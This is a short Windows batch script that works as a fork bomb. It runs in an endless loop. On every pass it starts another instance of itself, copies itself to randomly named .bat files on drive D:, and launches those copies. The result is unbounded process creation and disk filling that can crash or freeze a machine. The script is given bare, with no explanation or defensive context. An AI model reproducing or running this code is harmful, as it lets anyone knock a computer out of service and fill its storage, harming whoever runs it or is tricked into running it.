:fork
start %0
@echo off
copy "%~f0" "D:\forkbomb%random%.bat" >nul 2>&1
start "" "D:\forkbomb%random%.bat"
ping -n 1 -w 10 127.0.0.1 >nul
goto fork